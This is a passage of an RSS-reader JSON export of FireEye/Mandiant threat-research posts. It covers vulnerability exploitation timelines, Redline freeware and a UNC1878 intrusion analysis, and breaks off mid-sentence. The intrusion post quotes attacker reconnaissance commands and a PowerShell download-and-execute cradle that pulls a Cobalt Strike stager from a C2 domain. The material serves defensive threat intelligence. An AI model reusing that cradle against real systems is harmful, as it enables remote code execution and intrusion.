Dalla","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig1.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn36@2020_1/2020/08/24/14-11-06-919_f310539e6642ba82.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig2.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn97@2020_5/2020/08/24/14-11-15-089_da6966ec8db20fff.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig3.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn36@2020_3/2020/08/24/14-11-11-140_82f50da80bb1738a.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig4.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn43@2020_6/2020/08/24/14-11-12-128_2e3692745c9b0153.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig5.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn19@2020_4/2020/08/24/14-11-16-057_a3af770dc4232fb4.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig6.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn17@2020_3/2020/08/24/14-11-14-903_8be8e026e9eff6d2.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig7.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn29@2020_1/2020/08/24/14-11-17-488_127c5dfedebf5464.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig8a.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn40@2020_1/2020/08/24/14-11-12-208_d21d47ad780423de.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig8b.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn65@2020_6/2020/08/24/14-11-13-371_4392eed52e40ca2f.webp"},"publishedOrCreatedDate":1598278264196},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Think Fast: Time Between Disclosure, Patch Release and Vulnerability\nExploitation — Intelligence for Vulnerability Management, Part Two","link":"http://www.fireeye.com/blog/threat-research/2020/04/time-between-disclosure-patch-release-and-vulnerability-exploitation.html","description":"<p> <i>One of the critical strategic and tactical roles that cyber threat intelligence (CTI) plays is in the tracking, analysis, and prioritization of software vulnerabilities that could potentially put an organization’s data, employees and customers at risk. In this four-part blog series, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html\">FireEye Mandiant Threat Intelligence</a> highlights the value of CTI in enabling vulnerability management, and unveils new research into the latest threats, trends and recommendations. Check out our first post on <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/04/zero-day-exploitation-demonstrates-access-to-money-not-skill.html\">zero-day vulnerabilities</a>.</i></p> \n<p>Attackers are in a constant race to exploit newly discovered vulnerabilities before defenders have a chance to respond. FireEye Mandiant Threat Intelligence research into vulnerabilities exploited in 2018 and 2019 suggests that the majority of exploitation in the wild occurs before patch issuance or within a few days of a patch becoming available.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: Percentage of vulnerabilities exploited at various times in relation to patch release</span></p> \n<p>FireEye Mandiant Threat Intelligence analyzed 60 vulnerabilities that were either exploited or assigned a CVE number between Q1 2018 to Q3 2019. The majority of vulnerabilities were exploited as zero-days – before a patch was available. More than a quarter were exploited within one month after the patch date. Figure 2 illustrates the number of days between when a patch was made available and the first observed exploitation date for each vulnerability.</p> \n<p>We believe these numbers to be conservative estimates, as we relied on the first reported exploitation of a vulnerability linked to a specific date. Frequently, first exploitation dates are not publicly disclosed. It is also likely that in some cases exploitation occurred without being discovered before researchers recorded exploitation attached to a certain date.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture2.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 2: Time between vulnerability exploitation and patch issuance</span></p> \n<p>­­­<i>Time Between Disclosure and Patch Release</i></p> \n<p>The average time between disclosure and patch availability was approximately 9 days. This average is slightly inflated by vulnerabilities such as CVE-2019-0863, a Microsoft Windows server vulnerability, which was disclosed in December 2018 and not patched until 5 months later in May 2019. The majority of these vulnerabilities, however, were patched quickly after disclosure. In 59% of cases, a patch was released on the same day the vulnerability was disclosed. These metrics, in combination with the observed swiftness of adversary exploitation activity, highlight the importance of responsible disclosure, as it may provide defenders with the slim window needed to successfully patch vulnerable systems.</p> \n<p> <i>Exploitation After Patch Release</i></p> \n<p>While the majority of the observed vulnerabilities were zero-days, 42 percent of vulnerabilities were exploited after a patch had been released. For these non-zero-day vulnerabilities, there was a very small window (often only hours or a few days) between when the patch was released and the first observed instance of attacker exploitation. Table 1 provides some insight into the race between attackers attempting to exploit vulnerable software and organizations attempting to deploy the patch.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"623\" colspan=\"2\" valign=\"top\"><p style=\"text-align: center;\"> <b>Time to Exploit for Vulnerabilities First Exploited after a Patch</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"88\" valign=\"top\"><p>Hours</p> </td> \n   <td width=\"535\" valign=\"top\"><p>Two vulnerabilities were successfully exploited within hours of a patch release, CVE-2018-2628 and CVE-2018-7602.</p> </td> \n  </tr> \n  <tr> \n   <td width=\"88\" valign=\"top\"><p>Days</p> </td> \n   <td width=\"535\" valign=\"top\"><p>12 percent of vulnerabilities were exploited within the first week following the patch release.</p> </td> \n  </tr> \n  <tr> \n   <td width=\"88\" valign=\"top\"><p>One Month</p> </td> \n   <td width=\"535\" valign=\"top\"><p>15 percent of vulnerabilities were exploited after one week but within one month of patch release.</p> </td> \n  </tr> \n  <tr> \n   <td width=\"88\" valign=\"top\"><p>Years</p> </td> \n   <td width=\"535\" valign=\"top\"><p>In multiple cases, such as the first observed exploitation of CVE-2010-1871 and CVE-2012-0874 in 2019, attackers exploited vulnerabilities for which a patch had been made available many years prior.</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 1: Exploitation timing for patched vulnerabilities ranges from within hours of patch issuance to years after initial disclosure</span></p> \n<h4>Case Studies</h4> \n<p>We continue to observe espionage and financially motivated groups quickly leveraging publicly disclosed vulnerabilities in their operations. The following examples demonstrate the speed with which sophisticated groups are able to incorporate vulnerabilities into their toolsets following public disclosure and the fact that multiple disparate groups have repeatedly leveraged the same vulnerabilities in independent campaigns. Successful operations by these types of groups are likely to have a high potential impact.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture3.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 3: Timeline of activity for CVE-2018-15982</span></p> \n<p>CVE-2018-15982: A use after free vulnerability in a file package in Adobe Flash Player 31.0.0.153 and earlier that, when exploited, allows an attacker to remotely execute arbitrary code.&nbsp;This vulnerability was exploited by espionage groups—Russia's APT28 and North Korea's APT37—as well as TEMP.MetaStrike and other financially motivated attackers.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture4.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 4: Timeline of activity for CVE-2018-20250</span></p> \n<p>CVE-2018-20250: A path traversal vulnerability exists within the ACE format in the archiver tool WinRAR versions 5.61 and earlier that, when exploited, allows an attacker to locally execute arbitrary code. This vulnerability was exploited by multiple espionage groups, including Chinese, North Korean, and Russian, groups, as well as Iranian groups APT33 and TEMP.Zagros.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture5.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 5: Timeline of Activity for CVE-2018-4878</span></p> \n<p>CVE-2018-4878: A use after free vulnerability exists within the DRMManager’s “initialize” call in Adobe Flash Player 28.0.0.137 and earlier that, when exploited, allows an attacker to remotely execute arbitrary code. Mandiant Intelligence confirmed that North Korea’s APT37 exploited this vulnerability as a zero-day as early as September 3, 2017. Within 8 days of disclosure, we observed Russia’s APT28 also leverage this vulnerability, with financially motivated attackers and North Korea’s TEMP.Hermit also using within approximately a month of disclosure.</p> \n<h4>Availability of PoC or Exploit Code</h4> \n<p>The availability of POC or exploit code on its own does not always increase the probability or speed of exploitation. However, we believe that POC code likely hastens exploitation attempts for vulnerabilities that do not require user interaction. For vulnerabilities that have already been exploited, the subsequent introduction of publicly available exploit or POC code indicates malicious actor interest and makes exploitation accessible to a wider range of attackers. There were a number of cases in which certain vulnerabilities were exploited on a large scale within 48 hours of PoC or exploit code availability (Table 2).</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"168\"><p> <b>Time Between PoC or Exploit Code Publication and First Observed Potential Exploitation Events</b></p> </td> \n   <td width=\"160\"><p> <b>Product</b></p> </td> \n   <td width=\"152\"><p> <b>CVE</b></p> </td> \n   <td width=\"144\"><p> <b>FireEye Risk Rating</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"168\"><p>1 day</p> </td> \n   <td width=\"160\"><p>WinRAR</p> </td> \n   <td width=\"152\"><p>CVE-2018-20250</p> </td> \n   <td width=\"144\"><p>Medium</p> </td> \n  </tr> \n  <tr> \n   <td width=\"168\"><p>1 day</p> </td> \n   <td width=\"160\"><p>Drupal</p> </td> \n   <td width=\"152\"><p>CVE-2018-7600</p> </td> \n   <td width=\"144\"><p>High</p> </td> \n  </tr> \n  <tr> \n   <td width=\"168\"><p>1 day</p> </td> \n   <td width=\"160\"><p>Cisco Adaptive Security Appliance</p> </td> \n   <td width=\"152\"><p>CVE-2018-0296</p> </td> \n   <td width=\"144\"><p>Medium</p> </td> \n  </tr> \n  <tr> \n   <td width=\"168\"><p>2 days</p> </td> \n   <td width=\"160\"><p>Apache Struts</p> </td> \n   <td width=\"152\"><p>CVE-2018-11776</p> </td> \n   <td width=\"144\"><p>High</p> </td> \n  </tr> \n  <tr> \n   <td width=\"168\"><p>2 days</p> </td> \n   <td width=\"160\"><p>Cisco Adaptive Security Appliance</p> </td> \n   <td width=\"152\"><p>CVE-2018-0101</p> </td> \n   <td width=\"144\"><p>High</p> </td> \n  </tr> \n  <tr> \n   <td width=\"168\"><p>2 days</p> </td> \n   <td width=\"160\"><p>Oracle WebLogic Server</p> </td> \n   <td width=\"152\"><p>CVE-2018-2893</p> </td> \n   <td width=\"144\"><p>High</p> </td> \n  </tr> \n  <tr> \n   <td width=\"168\"><p>2 days</p> </td> \n   <td width=\"160\"><p>Microsoft Windows Server</p> </td> \n   <td width=\"152\"><p>CVE-2018-8440</p> </td> \n   <td width=\"144\"><p>Medium</p> </td> \n  </tr> \n  <tr> \n   <td width=\"168\"><p>2 days</p> </td> \n   <td width=\"160\"><p>Drupal</p> </td> \n   <td width=\"152\"><p>CVE-2019-6340</p> </td> \n   <td width=\"144\"><p>Medium</p> </td> \n  </tr> \n  <tr> \n   <td width=\"168\"><p>2 days</p> </td> \n   <td width=\"160\"><p>Atlassian Confluence</p> </td> \n   <td width=\"152\"><p>CVE-2019-3396</p> </td> \n   <td width=\"144\"><p>High</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 2: Vulnerabilities exploited within two days of either PoC or exploit code being made publicly available, Q1 2018–Q3 2019</span></p> \n<h4>Trends by Targeted Products</h4> \n<p>FireEye judges that malicious actors are likely to most frequently leverage vulnerabilities based on a variety of factors that influence the utility of different vulnerabilities to their specific operations. For instance, we believe that attackers are most likely to target the most widely used products (see Figure 6). Attackers almost certainly also consider the cost and availability of an exploit for a specific vulnerability, the perceived success rate based on the delivery method, security measures introduced by vendors, and user awareness around certain products.</p> \n<p>The majority of observed vulnerabilities were for Microsoft products, likely due to the ubiquity of Microsoft offerings. In particular, vulnerabilities in software such as Microsoft Office Suite may be appealing to malicious actors based on the utility of email attached documents as initial infection vectors in phishing campaigns.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture6.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 6: Exploited vulnerabilities by vendor, Q1 2018–Q3 2019</span></p> \n<h4>Outlook and Implications</h4> \n<p>The speed with which attackers exploit patched vulnerabilities emphasizes the importance of patching as quickly as possible. With the sheer quantity of vulnerabilities disclosed each year, however, it can be difficult for organizations with limited resources and business constraints to implement an effective strategy for prioritizing the most dangerous vulnerabilities. In upcoming blog posts, FireEye Mandiant Threat Intelligence describes our approach to vulnerability risk rating as well as strategies for making informed and realistic patch management decisions in more detail.</p> \n<p>We recommend using this exploitation trend information to better prioritize patching schedules in combination with other factors, such as known active threats to an organization's industry and geopolitical context, the availability of exploit and PoC code, commonly impacted vendors, and how widely software is deployed in an organization's environment may help to mitigate the risk of a large portion of malicious activity.</p> \n<p>Register today&nbsp;to hear FireEye Mandiant Threat Intelligence experts discuss the latest in&nbsp;<a href=\"https://www.brighttalk.com/webcast/7451/392772\">vulnerability threats, trends and recommendations</a>&nbsp;in our upcoming April 30 webinar.</p>","descriptionType":"html","publishedDate":"Mon, 13 Apr 2020 12:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture1.png","linkMd5":"9dbf756bd6310f2b67ad3a9f1762b440","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn27@2020_3/2020/08/24/14-11-04-898_7d8a8cff88e3cc5c.webp","destWidth":829,"destHeight":762,"sourceBytes":156362,"destBytes":32092,"author":"Kathleen Metrick","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn27@2020_3/2020/08/24/14-11-04-898_7d8a8cff88e3cc5c.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn71@2020_6/2020/08/24/14-11-18-732_b106de512d2ddce6.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn85@2020_6/2020/08/24/14-11-16-875_1e5bf8bbe40f80cf.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn55@2020_5/2020/08/24/14-11-17-495_4a129c49a537c314.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture5.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn6@2020_6/2020/08/24/14-11-15-117_6773582820e63a62.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnmanage2/Picture6.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn9@2020_3/2020/08/24/14-11-16-068_5f7f83724a4a01a5.webp"},"publishedOrCreatedDate":1598278264186},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"The Latest Version of Redline Finds Indicators of Compromise and More","link":"http://www.fireeye.com/blog/threat-research/2012/03/latest-version-redline-finds-indicators-compromise.html","description":"<div class=\"c00 c00v1\"> \n <p>We are on a roll with our freeware. The latest version of <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline</a> is now available! For those who are not familiar with Redline - you may be asking, what is it? Simply put, Redline brings together analysis tools which help you perform a guided investigation of a potentially compromised system. And did we mention that it is free?</p> \n <p>This latest and greatest version of Redline includes some awesome new features, courtesy of recommendations from our strong and growing user base and input from internal users here at Mandiant. For those who have been loyal Redline users, you will find that it is no longer just a memory forensics tool! It has grown into a multi-purpose product for creating Indicators of Compromise (IOC) and matching them across all types of host data, while maintaining all the traditional memory forensics capabilities that you're used to.</p> \n <p> <b>Get the data that matters, and do it faster</b></p> \n <ul> \n  <li>With Redline, you can now include and search for Indicators of Compromise and create a searchable report detailing any suspicious activity found matching those IOCs. Need more on what IOCs are? <a href=\"http://openioc.org/\">Click here</a> for more information.</li> \n  <li>Specify a set of IOCsbefore collection and Redline will now help tailor the configuration to provide meaningful search resultsand ensure that all the data required by the chosen IOCs is collected, speeding up your time to completion.</li> \n  <li>Not sure if the IOCs you have chosen are the ones you want? Not to worry! When choosing indicators to search for, there is now a handy preview window to see the detailed information of each indicator.</li> \n  <li>You are no longer limited to just memory data. Redline now enables you to configure and collect a much broader range of data about the target host, such as event logs and file listings. This data will in turn be searchable using the new Indicator of Compromise search options, providing you with better overall search results.</li> \n </ul> \n <p> <b>Multi-task with the best</b></p> \n <ul> \n  <li>With Redline you can now perform investigations while searching for indicators - at the same time! For example, while the session is still matching IOCs, you can start diving into the Malware Risk Indicator (MRI) Scores and start anew investigation or even continue an existing investigation.</li> \n  <li>Now there's no guessing where you are in the process. You can check the progress of your investigation at any time via \"Background Tasks\" in the main menu. You will also receive a notification when one of your background tasks has been scheduled.</li> \n </ul> \n <p>For our current users, be sure to <a href=\"http://www.mandiant.com/products/free_software/redline/\">upgrade</a> to this latest version of Redline to take advantage of the new features. For new users, don't wait another minute to download <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline</a> and get your hands on this great set of analysis tools. <br /> </p> \n</div>","descriptionType":"html","publishedDate":"Thu, 22 Mar 2012 00:15:06 +0000","feedId":1226,"bgimg":"","linkMd5":"2dff5d15158667161575b4ffac5d19fb","bgimgJsdelivr":"","metaImg":"","author":"Kristen Cooper","publishedOrCreatedDate":1598278264214},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Leveraging the Power of Solutions and Intelligence","link":"http://www.fireeye.com/blog/threat-research/2014/01/leveraging-power-solutions-intelligence.html","description":"<div class=\"c00 c00v1\"> \n <p>Welcome to my first post as a <a href=\"http://www.fireeye.com/\" target=\"_blank\">FireEye™</a> employee! Many of you have asked me what I think of FireEye's acquisition of Mandiant. One of the aspects of the new company that I find most exciting is our increased threat intelligence capabilities. This post will briefly explore what that means for our customers, prospects, and the public.</p> \n <p>By itself, Mandiant generates threat intelligence in a fairly unique manner from three primary sources. First, our <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html\">professional services</a> division learns about adversary tools, tactics, and procedures (TTPs) by assisting intrusion victims. This \"boots on the ground\" offering is unlike any other, in terms of efficiency (a small number of personnel required), speed (days or weeks onsite, instead of weeks or months), and effectiveness (we know how to remove advanced foes). By having consultants inside a dozen or more leading organizations every week of the year, Mandiant gains front-line experience of cutting-edge intrusion activity. Second, the <a href=\"https://www.mandiant.com/products/managed-defense/\" target=\"_blank\">Managed Defense™</a> division operates our software and provides complementary services on a multi-year subscription basis. This team develops long-term counter-intrusion experience by constantly assisting another set of customers in a managed security services model. Finally, Mandiant's intelligence team acquires data from a variety of sources, fusing it with information from professional services and managed defense. The output of all this work includes deliverables such as the annual <a href=\"https://www2.fireeye.com/fireeye-mandiant-m-trends-report\" target=\"_blank\">M-Trends report</a> and last year's <a href=\"http://intelreport.mandiant.com/\" target=\"_blank\">APT1 document</a>, both of which are free to the public. Mandiant customers have access to more intelligence through our software and services.</p> \n <p>As a security software company, <a href=\"http://www.fireeye.com/products-and-solutions/\" target=\"_blank\">FireEye deploys powerful appliances</a> into customer environments to inspect and (if so desired) quarantine malicious content. Most customers choose to benefit from the cloud features of the <a href=\"http://www.fireeye.com/products-and-solutions/\" target=\"_blank\">FireEye product suite</a>. This decision enables community self-defense and exposes a rich collection of the world's worst malware. As millions more instances of FireEye's MVX technology expand to mobile, cloud and data center environments, all of us benefit in terms of protection and visibility. Furthermore, FireEye's own threat intelligence and services components generate knowledge based on their visibility into adversary software and activity. Recent examples include breaking news on Android malware, identifying Yahoo! systems serving malware, and exploring \"cyber arms\" dealers. Like Mandiant, FireEye's customers benefit from intelligence embedded into the MVX platforms.</p> \n <p>Many have looked at the Mandiant and FireEye combination from the perspective of software and services. While these are important, both ultimately depend on access to the best threat intelligence available. As a combined entity, FireEye can draw upon nearly 2,000 employees in 40 countries, with a staff of security consultants, analysts, engineers, and experts not found in any other private organization. Stay tuned to the FireEye and Mandiant blogs as we work to provide an integrated view of adversary activity throughout 2014.</p> \n <p>I hope you can attend the FireEye + Mandiant - 4 Key Steps to Continuous Threat Protection webinar on Wednesday, Jan 29 at 2pm ET. During the webinar Manish Gupta, FireEye SVP of Products, and Dave Merkel, Mandiant CTO and VP of Products will discuss why traditional IT security defenses are no longer the safeguards they once were and what's now needed to protect against today's advanced threats.</p> \n</div>","descriptionType":"html","publishedDate":"Mon, 27 Jan 2014 20:40:15 +0000","feedId":1226,"bgimg":"","linkMd5":"1afe12609fa17ca285b29d61456c0dcd","bgimgJsdelivr":"","metaImg":"","author":"Richard Bejtlich","publishedOrCreatedDate":1598278264224},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"It’s Your Money and They Want It Now — The Cycle of Adversary Pursuit","link":"http://www.fireeye.com/blog/threat-research/2020/03/the-cycle-of-adversary-pursuit.html","description":"<p>When we discover new intrusions, we ask ourselves questions that will help us understand the totality of the activity set.</p> \n<p>How common is this activity? Is there anything unique or special about this malware or campaign? What is new and what is old in terms of TTPs or infrastructure? Is this being seen anywhere else? What information do I have that substantiates the nature of this threat actor?</p> \n<p>To track a fast-moving adversary over time, we exploit organic intrusion data, pivot to other data sets, and make that knowledge actionable for analysts and incident responders, enabling new discoveries and assessments on the actor. The FireEye Advanced Practices team exists to know more about the adversary than anyone else, and by asking and answering questions such as these, we enable analyst action in security efforts. In this blog post, we highlight how our cycle of identification, expansion, and discovery was used to track a financially motivated actor across FireEye’s global data sets.</p> \n<h4>Identification</h4> \n<p>On January 29, 2020, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html\">FireEye Managed Defense</a> investigated multiple TRICKBOT deployments against a U.S. based client. Shortly after initial deployment, TRICKBOT’s networkDll module ran the following network reconnaissance commands (Figure 1).</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">ipconfig /all<br /> net config workstation<br /> net view /all<br /> net view /all /domain<br /> nltest /domain_trusts<br /> nltest /domain_trusts /all_trusts</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 1: Initial Reconnaissance</span></p> \n<p>Approximately twenty minutes after reconnaissance, the adversary ran a PowerShell command to download and execute a Cobalt Strike HTTPS BEACON stager in memory (Figure 2).</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">cmd.exe /c powershell.exe -nop –w hidden –c “IEX ((new-object net.webclient).downloadstring(‘hxxps://cylenceprotect[.]com:80/abresgbserthgsbabrt’))”</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 2: PowerShell download cradle used to request a Cobalt Strike stager</span></p> \n<p>Six minutes later, Managed Defense identified evidence of enumeration and attempted lateral movement through the BEACON implant. Managed Defense alerted the client of the activity and the affected hosts were contained, stopping the intrusion in its tracks. A delta of approximately forty-six minutes between a TRICKBOT infection and attempted lateral movement was highly unusual and, along with the clever masquerade domain, warranted further examination by our team.</p> \n<p>Although light, indicators from this intrusion were distinct enough to create an uncategorized threat group, referred to as UNC1878. At the time of initial clustering, UNC1878’s intent was not fully understood due to the rapid containment of the intrusion by Managed Defense. By creating this label, we are able to link activity from the Managed Defense investigation into a single entity, allowing us to expand our understanding of this group and track their activity over time. This is especially important when dealing with campaigns involving mass malware, as it helps delineate the interactive actor from the malware campaign they are leveraging. For more information on our clustering methodology, check out our post&nbsp;about how we <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/03/clustering-and-associating-attacker-activity-at-scale.html\">analyze, separate, or merge these clusters at scale</a>.</p> \n<h4>Expansion</h4> \n<p>Pivoting on the command and control (C2) domain allowed us to begin building a profile of UNC1878 network infrastructure. WHOIS records for cylenceprotect[.]com (Figure 3)<i> </i>revealed that the domain was registered on January 27, 2020, with the registrar \"Hosting Concepts B.V. d/b/a Openprovider\", less than two days before we saw this domain used in activity impacting the Managed Defense customer.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">Domain Name: cylenceprotect.com<br /> Registry Domain ID: 2485487352_DOMAIN_COM-VRSN<br /> Registrar WHOIS Server: whois.registrar.eu<br /> Registrar URL: http://www.registrar.eu<br /> Updated Date: 2020-01-28T00:35:43Z<br /> Creation Date:&nbsp;<b>2020-01-27T23:32:18Z<br /> </b>Registrar Registration Expiration Date: 2021-01-27T23:32:18Z<br /> Registrar:&nbsp;<b>Hosting Concepts B.V. d/b/a Openprovider</b></span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 3: WHOIS record for the domain cylenceprotect[.]com</span></p> \n<p>Turning our attention to the server, the domain resolved to 45.76.20.140, an IP address owned by the VPS provider Choopa. In addition, the domain used self-hosted name servers ns1.cylenceprotect[.]com and ns2.cylenceprotect[.]com, which also resolved to the Choopa IP address. Network scan data for the server uncovered a certificate&nbsp;on port 80 and 443, a snippet of which can be seen in Figure 4.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">Certificate:<br /> &nbsp; &nbsp; Data:<br /> &nbsp; &nbsp; &nbsp; &nbsp; Version: 3 (0x2)<br /> &nbsp; &nbsp; &nbsp; &nbsp; Serial Number:<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 03:a8:60:02:c7:dd:7f:88:5f:2d:86:0d:88:41:e5:3e:25:f0<br /> &nbsp; &nbsp; Signature Algorithm: sha256WithRSAEncryption<br /> &nbsp; &nbsp; &nbsp; &nbsp; Issuer: C=US, O=Let's Encrypt, CN=Let's Encrypt Authority X3<br /> &nbsp; &nbsp; &nbsp; &nbsp; Validity<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<b>Not Before: Jan 28 02:02:14 2020 GMT<br /> </b>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Not After : Apr 27 02:02:14 2020 GMT<br /> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<b>Subject: CN=cylenceprotect[.]com</b></span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 4: TLS Certificate for the domain cylenceprotect[.]com</span></p> \n<p>The certificate was issued by Let’s Encrypt, with the earliest validity date within 24 hours of the activity detected by Managed Defense, substantiating the speed in which this threat actor operates. Along with the certificate in Figure 4, we also identified the default generated, self-signed Cobalt Strike certificate (Figure 5) on port 54546 (50050 by default).</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">Certificate:<br /> &nbsp; &nbsp; Data:<br /> &nbsp; &nbsp; &nbsp; &nbsp; Version: 3 (0x2)<br /> &nbsp; &nbsp; &nbsp; &nbsp; Serial Number: 1843990795 (0x6de9110b)<br /> &nbsp; &nbsp; Signature Algorithm: sha256WithRSAEncryption<br /> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<b>Issuer: C=Earth, ST=Cyberspace, L=Somewhere, O=cobaltstrike, OU=AdvancedPenTesting, CN=Major Cobalt Strike<br /> </b>&nbsp; &nbsp; &nbsp; &nbsp; Validity<br /> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<b>Not Before: Jan 28 03:06:30 2020 GMT<br /> </b>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Not After : Apr 27 03:06:30 2020 GMT<br /> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<b>Subject: C=Earth, ST=Cyberspace, L=Somewhere, O=cobaltstrike, OU=AdvancedPenTesting, CN=Major Cobalt Strike</b></span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 5: Default Cobalt Strike TLS Certificate used by UNC1878</span></p> \n<p>Similar to the certificate on port 80 and 443, the earliest validity date was again within 24 hours of the intrusion identified by Managed Defense. Continuing analysis on the server, we acquired the BEACON stager and subsequent BEACON payload, which was configured to use the <a href=\"https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile\">Amazon malleable C2 profile</a>.</p> \n<p>While these indicators may not hold significant weight on their own, together they create a recognizable pattern to fuel proactive discovery of related infrastructure. We began hunting for servers that exhibited the same characteristics as those used by UNC1878. Using third-party scan data, we quickly identified additional servers that matched a preponderance of UNC1878 tradecraft:</p> \n<ul> \n <li>Domains typically comprised of generic IT or security related terms such as “update”, “system”, and “service”.</li> \n <li>Domains registered with “Hosting Concepts B.V. d/b/a Openprovider\" as early as December 19, 2019.</li> \n <li>Self-hosted name servers.</li> \n <li>Let’s Encrypt certificates on port 80.</li> \n <li>Virtual private servers hosted predominantly by Choopa.</li> \n <li>BEACON payloads configured with the Amazon malleable C2 profile.</li> \n <li>Cobalt Strike Teams Servers on non-standard ports.</li> \n</ul> \n<p>Along with 